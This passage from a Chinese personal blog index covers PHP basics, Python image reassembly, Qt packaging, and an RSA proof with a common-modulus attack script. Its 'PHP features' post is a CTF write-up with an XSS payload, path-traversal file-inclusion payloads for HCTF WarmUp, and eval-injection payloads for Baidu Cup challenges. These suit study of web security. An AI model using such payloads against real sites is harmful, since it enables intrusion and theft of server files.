，但不鼓励使用。只有通过激活 php.ini 中的 short_open_tag 配置指令或者在编译 PHP 时使用了配置选项 –enable-short-tags 时才能使用短标记。短标记方式 开始&lt;? 和 结束?&gt; (不推荐使用) 需要在php.ini文件中开启SCRIPT风格 开始&lt;script language=&quot;php&quot;&gt; 结束 &lt;/script&gt; (不推荐使用) 不需要开启 可直接使用 2.php末尾可以不加结束标记如果文件内容是纯 PHP 代码，最好在文件末尾删除 PHP 结束标记。这可以避免在 PHP 结束标记之后万一意外加入了空格或者换行符，会导致 PHP 开始输出这些空白，而脚本中此时并无输出的意图。 ？？wtf什么玩意查了一下原因 PHP 解释器碰到 ?&gt; 结束标记时就简单地将其后内容原样输出，直到碰到下一个开始标记。PHP 会在输出时自动删除其结束符 ?&gt; 后的一个换行。该功能主要是针对在一个页面中嵌入多段 PHP 代码或者包含了无实质性输出的 PHP 文件而设计，与此同时也造成了一些疑惑。如果需要在 PHP 结束符 ?&gt; 之后输出换行的话，可以在其后加一个空格，或者在最后的一个 echo/print 语句中加入一个换行。这些影响最多的时候应该是在使用 include 和 require的时候 3.指令分隔符是否需要同 C 或 Perl 一样，PHP 需要在每个语句后用分号结束指令。一段 PHP 代码中的结束标记隐含表示了一个分号；在一个 PHP 代码段中的最后一行可以不用分号结束。如果后面还有新行，则代码段的结束标记包含了行结束。 4.注释&lt;?php echo &quot;This is a test&quot;; // This is a one-line c++ style comment /* This is a multi line comment yet another line of comment */ echo &quot;This is yet another test&quot;; echo &apos;One Final Test&apos;; # This is a one-line shell-style comment?&gt; 5.类型PHP 支持 9 种原始数据类型。四种标量类型：◦ boolean（布尔型）◦ integer（整型）◦ float（浮点型，也称作 double)◦ string（字符串） 三种复合类型：◦ array（数组）◦ object（对象）◦ callable（可调用） 最后是两种特殊类型：◦ resource（资源）◦ NULL（无类型） 还有一些伪类型：◦ mixed（混合类型）◦ number（数字类型）◦ callback（回调类型，又称为 callable）◦ array|object（数组 | 对象类型）◦ void （无类型） 6.一大堆布尔值布尔值要明确地将一个值转换成 boolean，用 (bool) 或者 (boolean) 来强制转换。但是很多情况下不需要用强制转换，因为当运算符，函数或者流程控制结构需要一个 boolean 参数时，该值会被自动转换。 当转换为 boolean 时，以下值被认为是 FALSE：◦ 布尔值 FALSE 本身◦ 整型值 0（零）◦ 浮点型值 0.0（零）◦ 空字符串，以及字符串 “0”◦ 不包括任何元素的数组◦ 特殊类型 NULL（包括尚未赋值的变量）◦ 从空标记生成的 SimpleXML 对象 所有其它值都被认为是 TRUE（包括任何资源 和 NAN）。 &lt;?phpvar_dump((bool) &quot;&quot;); // bool(false)var_dump((bool) 1); // bool(true)var_dump((bool) -2); // bool(true)var_dump((bool) &quot;foo&quot;); // bool(true)var_dump((bool) 2.3e5); // bool(true)var_dump((bool) array(12)); // bool(true)var_dump((bool) array()); // bool(false)var_dump((bool) &quot;false&quot;); // bool(true)?&gt; 7.数值进制WarningPHP 7 以前的版本里，如果向八进制数传递了一个非法数字（即 8 或 9），则后面其余数字会被忽略。PHP 7 以后，会产生 Parse Error。 8.NaN某些数学运算会产生一个由常量 NAN 所代表的结果。此结果代表着一个在浮点数运算中未定义或不可表述的值。任何拿此值与其它任何值（除了 TRUE）进行的松散或严格比较的结果都是 FALSE。 由于 NAN 代表着任何不同值，不应拿 NAN 去和其它值进行比较，包括其自身，应该用 is_nan() 来检查。 9.数组&lt;?php$array = array( &quot;foo&quot; =&gt; &quot;bar&quot;, &quot;bar&quot; =&gt; &quot;foo&quot;,);// 自 PHP 5.4 起$array = [ &quot;foo&quot; =&gt; &quot;bar&quot;, &quot;bar&quot; =&gt; &quot;foo&quot;,];?&gt; 没有键名的索引数组 &lt;?php$array = array(&quot;foo&quot;, &quot;bar&quot;, &quot;hallo&quot;, &quot;world&quot;);var_dump($array);?&gt; array(4) { [0]=&gt; string(3) &quot;foo&quot; [1]=&gt; string(3) &quot;bar&quot; [2]=&gt; string(5) &quot;hallo&quot; [3]=&gt; string(5) &quot;world&quot;} 10.Object 对象&lt;?phpclass foo{ function do_foo() { echo &quot;Doing foo.&quot;; }}$bar = new foo;$bar-&gt;do_foo();?&gt; 11.引用赋值&lt;?php$foo = 25;$bar = &amp;$foo; // 合法的赋值$bar = &amp;(24 * 7); // 非法; 引用没有名字的表达式function test(){ return 25;}$bar = &amp;test(); // 非法?&gt; 使用引用赋值，简单地将一个 &amp; 符号加到将要赋值的变量前（源变量）。只有有名字的变量才可以引用赋值。 12.global 关键字&lt;?php$a = 1;$b = 2;function Sum(){ global $a, $b; $b = $a + $b;}Sum();echo $b;?&gt; &lt;?php$a = 1;$b = 2;function Sum(){ $GLOBALS[&apos;b&apos;] = $GLOBALS[&apos;a&apos;] + $GLOBALS[&apos;b&apos;];}Sum();echo $b;?&gt; 13.可变变量有时候使用可变变量名是很方便的。就是说，一个变量的变量名可以动态的设置和使用。一个普通的变量通过声明来设置，例如： &lt;?php$a = &apos;hello&apos;;?&gt; 一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。在上面的例子中 hello 使用了两个美元符号（$）以后，就可以作为一个可变变量的变量了。例如： &lt;?php$$a = &apos;world&apos;;?&gt; 这时，两个变量都被定义了：$a 的内容是”hello”并且 $hello 的内容是”world”。因此，以下语句： &lt;?phpecho &quot;$a ${$a}&quot;;?&gt; 与以下语句输出完全相同的结果： &lt;?phpecho &quot;$a $hello&quot;;?&gt; 它们都会输出：hello world。Warning注意，在 PHP 的函数和类的方法中，超全局变量不能用作可变变量。$this 变量也是一个特殊变量，不能被动态引用。精彩的代码 $a = &quot;We&quot;; // $a will echo &quot;We&quot; .. and &quot;We&quot; will take $We;$We = &quot;are&quot;; // $$a will echo &quot;are&quot; .. and &quot;are&quot; will take $are;$are = &quot;love&quot;; // $$$a will echo &quot;love&quot; .. and &quot;love&quot; will take $love;$love = &quot;php&quot;; // $$$$a will echo &quot;php&quot; .. and &quot;php&quot; will take $php;$php = &quot;lang&quot;; // $$$$$a will echo &quot;lang&quot; .. and &quot;lang&quot; will not take any variables;echo $a; //Returns We [1]echo $$a; //Returns are [2]echo $$$a; //Returns love [3]echo $$$$a; //Returns php [4]echo $$$$$a; //Returns lang [5] 14.魔术常量 几个 PHP 的”魔术常量”名称 说明 __LINE__ 文件中的当前行号。 __FILE__ 文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。自 PHP 4.0.2 起，FILE 总是包含一个绝对路径（如果是符号连接，则是解析后的绝对路径），而在此之前的版本有时会包含一个相对路径。 __DIR__ 文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于 dirname(FILE)。除非是根目录，否则目录中名不包括末尾的斜杠。（PHP 5.3.0中新增） = __FUNCTION__ 函数名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该函数被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。 __CLASS__ 类的名称（PHP 4.3.0 新加）。自 PHP 5 起本常量返回该类被定义时的名字（区分大小写）。在 PHP 4 中该值总是小写字母的。类名包括其被声明的作用区域（例如 Foo\\Bar）。注意自 PHP 5.4 起 CLASS 对 trait 也起作用。当用在 trait 方法中时，CLASS 是调用 trait 方法的类的名字。 __TRAIT__ Trait 的名字（PHP 5.4.0 新加）。自 PHP 5.4 起此常量返回 trait 被定义时的名字（区分大小写）。Trait 名包括其被声明的作用区域（例如 Foo\\Bar）。 __METHOD__ 类的方法名（PHP 5.0.0 新加）。返回该方法被定义时的名字（区分大小写）。 __NAMESPACE__ 当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP 5.3.0 新增）。 15.错误控制运算符PHP 支持一个错误控制运算符：@。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。 16.执行运算符PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符”&quot;的效果与函数 shell_exec() 相同。 $output&quot;; ?&gt;`反引号运算符在激活了安全模式或者关闭了 shell_exec() 时是无效的。 17.字符串运算符有两个字符串（string）运算符。第一个是连接运算符（”.”），它返回其左右参数连接后的字符串。第二个是连接赋值运算符（”.=”），它将右边参数附加到左边的参数之后。更多信息见赋值运算符。 &lt;?php$a = &quot;Hello &quot;;$b = $a . &quot;World!&quot;; // now $b contains &quot;Hello World!&quot;$a = &quot;Hello &quot;;$a .= &quot;World!&quot;; // now $a contains &quot;Hello World!&quot;?&gt; If you attempt to add numbers with a concatenation operator, your result will be the result of those numbers as strings.&lt;?phpecho &quot;thr&quot;.&quot;ee&quot;; //prints the string &quot;three&quot;echo &quot;twe&quot; . &quot;lve&quot;; //prints the string &quot;twelve&quot;echo 1 . 2; //prints the string &quot;12&quot;echo 1.2; //prints the number 1.2echo 1+2; //prints the number 3?&gt; 18.类型运算符instanceof 用于确定一个 PHP 变量是否属于某一类 class 的实例： Example #1 对类使用 instanceof &lt;?phpclass MyClass{}class NotMyClass{}$a = new MyClass;var_dump($a instanceof MyClass);var_dump($a instanceof NotMyClass);?&gt; 以上例程会输出： bool(true)bool(false) instanceof　也可用来确定一个变量是不是继承自某一父类的子类的实例 19.foreachforeach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法： foreach (array_expression as $value) statementforeach (array_expression as $key =&gt; $value) statement 20.可变函数可变函数 PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。 &lt;?php// 使用 echo 的包装函数function echoit($string){ echo $string;}$func = &apos;echoit&apos;;$func(&apos;test&apos;); // This calls echoit()?&gt; 21. 匿名函数&lt;?php$greet = function($name){ printf(&quot;Hello %s\\r\\n&quot;, $name);};$greet(&apos;World&apos;);$greet(&apos;PHP&apos;);?&gt;","link":"2019/10/03/PHP%E6%96%87%E6%A1%A3%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/"},{"title":"php特性","text":"1、超级全局变量超级全局变量在PHP 4.1.0之后被启用, 是PHP系统中自带的变量，在一个脚本的全部作用域中都可用。$_SERVER[“PHP_SELF”]; PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。 PHP 超级全局变量列表: 1. $GLOBALS2. $_SERVER3. $_REQUEST4. $_POST5. $_GET6. $_FILES7. $_ENV8. $_COOKIE9. $_SESSION 2、PHP $_SERVER$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。 &lt;?php echo $_SERVER[&apos;PHP_SELF&apos;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&apos;SERVER_NAME&apos;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&apos;HTTP_HOST&apos;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&apos;HTTP_REFERER&apos;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&apos;HTTP_USER_AGENT&apos;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&apos;SCRIPT_NAME&apos;];?&gt; 3、$_SERVER[’PHP_SELF’]的跨站脚本攻击$_SERVER[‘PHP_SELF’]是PHP语言中的“服务器端系统变量”，它的值是当前php文件相对于网站根目录的位置地址.比如当 &lt;?phpecho $_SERVER[&apos;PHP_SELF&apos;];?&gt; 正常访问是这样的显然这样可以很方便XSS，因为直接echo在页面上，所以只需要在尾部加上/&lt;script&gt;alert(&quot;Hello&quot;)&lt;/script&gt;即可，建议大家先URL加密一次，不过问题不大当然正常的代码不会直接输出在界面上，但是当开发人员一个表单的在action本页面，则可能会 &lt;form action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;];?&gt;&quot;method=&quot;POST&quot;&gt;.....&lt;/form&gt; 正常访问是这样的 但是 当你在尾部加上 /&quot;&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; 则由原来生成的 &lt;form action=&quot;/demo.php/{{多加入的参数}}&quot; method=&quot;POST&quot;&gt; 变成了，符号是自己加上去，表示区分 &lt;form action=&quot;/demo.php/{{&quot;&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;}}&quot; method=&quot;POST&quot;&gt; 最终 &lt;form action=&quot;/demo.php/&quot;&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot; method=&quot;POST&quot;&gt; 成功执行了XSS 3.1、解决办法-&gt; 通过htmlentities($_SERVER[‘PHP_SELF’]);过滤PS:$_SERVER 变量中的重要元素: 元素/代码 描述 $_SERVER[‘PHP_SELF’] 返回当前执行脚本的文件名。 $_SERVER[‘GATEWAY_INTERFACE’] 返回服务器使用的 CGI 规范的版本。 $_SERVER[‘SERVER_ADDR’] 返回当前运行脚本所在的服务器的 IP 地址。 $_SERVER[‘SERVER_NAME’] 返回当前运行脚本所在的服务器的主机名。 $_SERVER[‘SERVER_SOFTWARE’] 返回服务器标识字符串（比如 Apache/2.2.24）。 $_SERVER[‘SERVER_PROTOCOL’] 返回请求页面时通信协议的名称和版本（例如，“HTTP/1.0”）。 $_SERVER[‘REQUEST_METHOD’] 返回访问页面使用的请求方法（例如 POST）。 $_SERVER[‘REQUEST_TIME’] 返回请求开始时的时间戳（例如 1577687494）。 $_SERVER[‘QUERY_STRING’] 返回查询字符串，如果是通过查询字符串访问此页面。 $_SERVER[‘HTTP_ACCEPT’] 返回来自当前请求的请求头。 $_SERVER[‘HTTP_ACCEPT_CHARSET’] 返回来自当前请求的 Accept_Charset 头（ 例如 utf-8,ISO-8859-1） $_SERVER[‘HTTP_HOST’] 返回来自当前请求的 Host 头。 $_SERVER[‘HTTP_REFERER’] 返回当前页面的完整 URL（不可靠，因为不是所有用户代理都支持）。 $_SERVER[‘HTTPS’] 是否通过安全 HTTP 协议查询脚本。 $_SERVER[‘REMOTE_ADDR’] 返回浏览当前页面的用户的 IP 地址。 $_SERVER[‘REMOTE_HOST’] 返回浏览当前页面的用户的主机名。 $_SERVER[‘REMOTE_PORT’] 返回用户机器上连接到 Web 服务器所使用的端口号。 $_SERVER[‘SCRIPT_FILENAME’] 返回当前执行脚本的绝对路径。 $_SERVER[‘SERVER_ADMIN’] 该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。 $_SERVER[‘SERVER_PORT’] Web 服务器使用的端口。默认值为 “80”。 $_SERVER[‘SERVER_SIGNATURE’] 返回服务器版本和虚拟主机名。 $_SERVER[‘PATH_TRANSLATED’] 当前脚本所在文件系统（非文档根目录）的基本路径。 $_SERVER[‘SCRIPT_NAME’] 返回当前脚本的路径。 $_SERVER[‘SCRIPT_URI’] 返回当前页面的 URI。 PHP中preg_match正则匹配的/u /i /s是什么意思/u 表示按unicode(utf-8)匹配（主要针对多字节比如汉字）/i 表示不区分大小写（如果表达式里面有 a， 那么 A 也是匹配对象）/s 表示将字符串视为单行来匹配 [HCTF 2018]WarmUpOrz啥都不说了，先膜两张图上图中能发现两个特性，一个是win10真的金贵，一个就是demo?/../flag.txt能直接包含到flag.txt这是为啥呢 原理是demo?/被当作目录，之后上跳目录就好了（这个只适用于linux） OrZ然后这个审计的题目 &lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can&apos;t see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . &apos;?&apos;, &apos;?&apos;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &apos;?&apos;, &apos;?&apos;) ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can&apos;t see it&quot;; return false; } } if (! empty($_REQUEST[&apos;file&apos;]) &amp;&amp; is_string($_REQUEST[&apos;file&apos;]) &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;]) ) { include $_REQUEST[&apos;file&apos;]; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; 利用方法其实有两种，第一种是通过url两次编码的问题然后 整体的思路就是第一段不出现?，第二段又要出现?。所以进行二次urlencode编码， %253f浏览器会自动解码一次变成%3f，再经过代码的urldecode()变成?。接下来就是文件包含了-但是感觉和直接读取一样的 paylaod=file=source.php%253f/../../../../ffffllllaaaagggg方法二就是用上面的那个漏洞,直接读取 file=source.php?/../../../../../ffffllllaaaagggg “百度杯”CTF比赛 2017 二月场爆破-1描述flag就在某六位变量中。题目的意思是flag.php中定义了一个flag字符串 我们传递hello如果为那个变量 那个$$a就能把flag丢出来 &lt;?phpinclude &quot;flag.php&quot;;$a = @$_REQUEST[&apos;hello&apos;];if(!preg_match(&apos;/^\\w*$/&apos;,$a )){ die(&apos;ERROR&apos;);}eval(&quot;var_dump($$a);&quot;);show_source(__FILE__);?&gt; 爆破的话贼恶心，所以正确的姿势应该是 hello=GLOBALS,使用超全局变量GLOBALS http://138c4d7d85c04385b91b779047d5906d0a331ddc3728405a.changame.ichunqiu.com/?hello=GLOBALS得到[&quot;d3f0f8&quot;]=&gt; string(42) &quot;flag{bfed2cef-1a03-4337-9f55-b00ddbcc5f0a} “百度杯”CTF比赛 2017 二月场爆破-2&lt;?phpinclude &quot;flag.php&quot;;$a = @$_REQUEST[&apos;hello&apos;];eval( &quot;var_dump($a);&quot;);show_source(__FILE__); payload http://4139dc5d40184be4bb481b0d09226223d3815a7b2aea4456.changame.ichunqiu.com/?hello=file_get_contents(&apos;flag.php&apos;) “百度杯”CTF比赛 2017 二月场爆破-3题目描述:这个真的是爆破 &lt;?php error_reporting(0);session_start();require(&apos;./flag.php&apos;);if(!isset($_SESSION[&apos;nums&apos;])){ $_SESSION[&apos;nums&apos;] = 0; $_SESSION[&apos;time&apos;] = time(); $_SESSION[&apos;whoami&apos;] = &apos;ea&apos;;}if($_SESSION[&apos;time&apos;]+120&lt;time()){ session_destroy();}$value = $_REQUEST[&apos;value&apos;];$str_rand = range(&apos;a&apos;, &apos;z&apos;);$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];if($_SESSION[&apos;whoami&apos;]==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0){ $_SESSION[&apos;nums&apos;]++; $_SESSION[&apos;whoami&apos;] = $str_rands; echo $str_rands;}if($_SESSION[&apos;nums&apos;]&gt;=10){ echo $flag;}show_source(__FILE__);?&gt; 这样的题目本地调试最好了其实就是传value要等于$_SESSION[&apos;whoami&apos;]，而后者每次会变，但是会显示出来很沙雕的一点是substr(md5($value),5,4)==0,通过前面$value[0].$value[1]我们知道value是字符串数组，数组的md5是null，和0是弱相等的~所以第一次传?value[0]=e&amp;value[1]=a,会返回两个字符 假设是bq 那就 ?value[0]=b&amp;value[1]=q,十次就行，脚本写起来也简单payload import requestsurl=&apos;http://9c132b640d22437c940c92547bb4a80f30f6958b40284a36.changame.ichunqiu.com/&apos;session=requests.Session()html=session.get(url+&apos;?value[]=ea&apos;).textfor i in range(10): html=session.get(url+&apos;?value[]=&apos;+html[0:2],timeout=2).text if &apos;flag{.*}&apos; in html: break print(html[0:2])print (html[:50])","link":"2019/04/11/PHP%E7%89%B9%E6%80%A7/"},{"title":"Python拼图","text":"之前一直会碰到拼二维码什么的，总是浪费很多时间最近看到一个大师傅的一个想法，通过图片的修改时间来拼图Orz主要是os模块对文件的操作 import osimport timefile=&apos;1.mp4&apos;os.path.getatime(file) #输出最近访问时间1318921018.0os.path.getctime(file) #输出文件创建时间os.path.getmtime(file) #输出最近修改时间time.gmtime(os.path.getmtime(file)) #以struct_time形式输出最近修改时间os.path.getsize(file) #输出文件大小（字节为单位）os.path.abspath(file) #输出绝对路径&apos;/Volumes/Leopard/Users/Caroline/Desktop/1.mp4&apos;os.path.normpath(file) #输出&apos;/Volumes/Leopard/Users/Caroline/Desktop/1.mp4&apos; 比如说这样一大堆的拼图手动拼肯定人都要没了，基于时间考虑就是默认认为图片碎片生成的时间是有规律的，从上往下，由左至右我们利用os.path.getmtime(file) #输出最近修改时间即可快速完成 # coding=utf-8import osfrom PIL import Imagepath = &quot;./all/&quot;def get_file_list(file_path): dir_list = os.listdir(file_path) if not dir_list: return else: dir_list = sorted(dir_list, key=lambda x: os.path.getmtime(os.path.join(file_path, x))) print(dir_list) return dir_listlist_im = get_file_list(path)column = 6row_num = 6width = 51height = 51imgs = [Image.open(path+i) for i in list_im]target = Image.new(&apos;RGB&apos;, (width*column, height*row_num))for i in range(len(list_im)): if i % column == 0: end = len(list_im) if i + column &gt; len(list_im) else i + column for col, image in enumerate(imgs[i:i+column]): target.paste(image, (width*col, height*(i//column), width*(col + 1), height*(i//column + 1))) target.show() Orz 2019121又出现了，这回要自己改一下长度和后缀，容易改乱了 import osfrom PIL import Imagepath = &quot;./result/&quot;def get_file_list(file_path): dir_list = os.listdir(file_path) if not dir_list: return else: dir_list = sorted(dir_list, key=lambda x: os.path.getmtime(os.path.join(file_path, x))) print(dir_list) return dir_listlist_im = get_file_list(path)column = 6row_num = 6width = 134height = 134for i in list_im: os.rename(path+i,path+i+&apos;.png&apos;) img = Image.open(path+i+&apos;.png&apos;) out = img.resize((width, height),Image.ANTIALIAS) os.remove(path+i+&apos;.png&apos;) out.save(path+i+&apos;.png&apos;, &apos;png&apos;)imgs = [Image.open(path+i+&apos;.png&apos;) for i in list_im]target = Image.new(&apos;RGB&apos;, (width*column, height*row_num))for i in range(len(list_im)): if i % column == 0: end = len(list_im) if i + column &gt; len(list_im) else i + column for col, image in enumerate(imgs[i:i+column]): target.paste(image, (width*col, height*(i//column), width*(col + 1), height*(i//column + 1))) target.show()","link":"2019/09/21/Python%E6%8B%BC%E5%9B%BE/"},{"title":"Qt环境搭建以及自动打包","text":"一、下载安装（Qt是什么就不用我说了 自行百度咯1. 官网下载开始我以为下载qtcreator就是下载了qt,然后发现居然下载qtcreator只是一个空壳，下载qt自带一个qtceator,折腾了老半天，嘤嘤嘤，所以下面地址是直接下载qt的http://download.qt.io/official_releases/qt/ 我下载的是qt-opensource-windows-x86-5.9.0.exe 2. 安装一路安装下去，此地无账号可以注册一个，为免费的开源版本组件的选择，按需求下，以下是根据《Qt 5.9 C++开发指南》实例下载，这本书还是不错的 3.一些小小的设置设置部分都在Tools-&gt;options，里面有基本上所有的设置包括中文，但是非常不建议中文（你试试就知道了在buiud&amp;run里面可以看到现在的编辑器，当前主要在使用Qt 5.9.0 MinGW 32bit字体风格啥的就自己去瞅瞅就行了 二、编译一个Hello Kitty1. 新建一个项目选择左上角的FIle-&gt;New File or Project这里选择第一个即可然后Kit可以随意选择一个或者多个，会自动检测qt已经具备的Kit,当然全选也可以，反正玩玩而已 2. 项目文件结构总结一下常见文件目录的作用 Headers指定项目中所有的头文件。 FORMS指定UI文件在编译前被uic处理。所有的构建这些UI文件所需的依赖、头文件和源文件都会自动被添加到项目中。 CONFIG指定编译器选项和项目配置，值由qmake内部识别并具有特殊意义。 LIBS指定链接到项目中的库列表。如果使用Unix -l (library) 和 -L (library path) 标志，在Windows上qmake正确处理库（也就是说，将库的完整路径传递给链接器），库必须存在，qmake会寻找-l指定的库所在的目录。 SOURCES指定项目中所有源文件。 3.Designqtcreator具备可视化编辑ui,双击mainwindow.ui即进入左侧任务栏中的Design在左侧拉一个Display Widgets-&gt;Label 进去即可 三、编译以及打包1. 编译，选择Qt 5.9.0 MinGW 32bit(不是强制，可自选)，为了打包所以选择Release点击第二个（非debug,即可编译运行，然后会在源代码的文件夹出现一个build-XX的文件目录找到里面的release-&gt;hello.exe 双击运行会提示少一大堆.dll,所以要打包 2. 自动打包Qt 官方开发环境使用的动态链接库方式，在发布生成的exe程序时，需要复制一大堆 dll，如果自己去复制dll，很可能丢三落四，导致exe在别的电脑里无法正常运行。因此 Qt 官方开发环境里自带了一个工具：windeployqt.exe。这个工具在该编译器所在的bin目录下，是一个终端操作工具你只需要把release目录下的hello.exe复制到bin目录下 cmd输入 windeployqt.exe hello.exe即可，但是这个会导致你的bin目录非常恶心所以直接，新建一个目录，里面放一个从Releasee复制出来的hello.exe,cmd切到hello.exe目录下然后（只要一个hello.exe即可） {你自己的Qt安装路径}\\Qt\\5.9\\mingw53_32\\bin\\windeployqt.exe hello.exe 或者先把该编译器的bin目录放在环境变量中 windeployqt.exe hello.exe 然后hello.exe 文件夹下会出现一堆依赖文件，即可帮助你运行hello.exe 3.可能遇到的问题windeployqt.exe的作用其实也就是简单把项目需要的的dll从bin目录下复制出来，所以如果在打包之后运行还提示缺少了什么.dll文件，直接去编译器的bin目录下复制过来即可。","link":"2019/01/02/Qt%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E8%87%AA%E5%8A%A8%E6%89%93%E5%8C%85/"},{"title":"RSA证明","text":"一、RSA介绍RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用。RSA 是 1977 年由罗纳德 · 李维斯特（Ron Rivest）、阿迪 · 萨莫尔（Adi Shamir）和伦纳德 · 阿德曼（Leonard Adleman）一起提出的。RSA 就是他们三人姓氏开头字母拼在一起组成的。RSA 算法的可靠性由极大整数因数分解的难度决定。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的 RSA 密钥才可能被强力方式解破。到 2017 年为止，还没有任何可靠的攻击 RSA 算法的方式。 二、已知条件RSA的加密规则：$ \\color{blue}{m^e \\equiv c\\pmod n}$RSA的解密规则：$\\color{red}{c^d \\equiv m\\pmod n}$ 约束条件及规则说明： m为明文字符，c为密文字符 m为0到n-1之间的数值 n=pq，p,q为素数 φ(n)=(p-1)*(q-1) [根据欧拉定理] e与φ(n)互素 $ ed \\equiv 1\\pmod {φ(n)}$ 欧拉公式$m^φ(n) \\equiv 1\\pmod n$ 要根据加密规则，数论及欧拉定理，来证明解密公式正确性：$\\color{red}{c^d \\equiv m\\pmod n}$ 三、证明过程step1、根据加密规则公式$ \\color{blue}{m^e \\equiv c\\pmod n}$可以得出 $$c=m^e-kn$$step2、 将C带入解密公式，得到$$(m^e-kn)^d \\equiv m\\pmod n$$step3、左边的展开中，除了第一项以外，其他项都与n相乘过，所以可以直接忽略左边括号中的kn项目，即：$$m^{ed} \\equiv m\\pmod n$$step4、因为 $ed\\equiv1 \\pmod {φ(n)}$ 即： $$ed=hφ(n)+1$$step5、上述结论代入step3的公式，得到$$m^{hφ(n)+1} \\equiv m \\pmod n $$step6、分情况讨论6.1 、m与n互质（如果你已经忘了m和n是什么了，请往前再看一遍）根据欧拉定理$m^φ(n) \\equiv 1\\pmod n$ 得到 $m^{φ(n)}=kn+1$然后左右两边分别h次方得到(kn+1)的h次方还是kn+1只不过这里的k变了：$$(m^{φ(n)})^h=kn+1$$然后左右两边乘以m即得到$$m^{hφ(n)+1} \\equiv m \\pmod n $$6.2 、m与n不互质此时，由于n等于质数p和q的乘积，所以m必然等于kp或kq。以 m = kp为例，这时k与q必然互质。如果k与q 不为互质关系，则k=tq, m= tqp=tn, 但是按照RSA规范，m∈(0…n−1) m\\in(0…n-1)m∈(0…n−1), m &lt; n的，所以k与q肯定是互质关系的。由于k与q互质，p与q互质，kp与q肯定互质，则根据欧拉定理，下面的式子成立：$$\\Large (kp)^{ q-1} \\equiv 1\\pmod q$$进一步扩展，可得：$$ \\Large [(kp)^{ q-1}]^{h(p-1)}\\times kp \\equiv kp\\pmod q$$即$$\\Large (kp)^{ed} \\equiv kp\\pmod q$$进一步改写成等式：$$\\Large (kp)^{ed} = kp+tq$$显然，t能被p整除， 即t=t’p,可以得出$$\\Large (kp)^{ed} = kp+t’pq$$ 因为m=kp, n=pq, 最后得出$$\\Large m^{ed} \\equiv m\\pmod n$$解密公式得到完全证明。 四、关于共模攻击脚本（其他的脚本要求安一堆奇怪的包，在win10还装不上，这里贴一个野生的共模攻击脚本# coding=utf-8import syssys.setrecursionlimit(10000000)&quot;&quot;&quot;选择相同的模 n 加密相同的信息 m&quot;&quot;&quot;helpstr = &apos;&apos;&apos;usage: c1 = m ^ e1 % n c2 = m ^ e2 % n&apos;&apos;&apos;def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&apos;modular inverse does not exist&apos;) else: return x % mdef main(): print(helpstr) n = int(input(&quot;input n: &quot;)) c1 = int(input(&quot;input c1: &quot;)) c2 = int(input(&quot;input c2: &quot;)) e1 = int(input(&quot;input e1: &quot;)) e2 = int(input(&quot;input e2: &quot;)) s = egcd(e1, e2) s1 = s[1] s2 = s[2] # 求模反元素 if s1 &lt; 0: s1 = - s1 c1 = modinv(c1, n) elif s2 &lt; 0: s2 = - s2 c2 = modinv(c2, n) m = (c1**s1)*(c2**s2) % n print(m)if __name__ == &apos;__main__&apos;: main() 分解模数脚本 # 分解模数ndef rsa_moder(n): base = 2 while base &lt; n: if n % base == 0: return base, n // base base += 1# 求欧拉函数f(n)def rsa_get_euler(prime1, prime2): return (prime1 - 1) * (prime2 - 1)# 求私钥def rsa_get_key(e, euler): k = 1 while True: if (((euler * k) + 1) % e) 